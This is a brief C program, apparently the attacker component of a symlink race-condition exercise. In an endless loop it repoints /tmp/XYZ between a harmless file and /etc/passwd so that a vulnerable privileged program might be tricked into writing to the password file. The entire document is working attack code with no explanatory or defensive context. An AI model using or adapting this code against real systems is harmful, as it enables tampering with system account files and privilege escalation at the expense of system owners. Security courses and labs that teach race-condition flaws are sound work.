#include <unistd.h>
int main(){
  while(1){
    unlink("/tmp/XYZ");
    symlink("/tmp/A","/tmp/XYZ");
    sleep(3);
    unlink("/tmp/XYZ");
    symlink("/etc/passwd","/tmp/XYZ");
    sleep(3);
  }
  return 0;
}
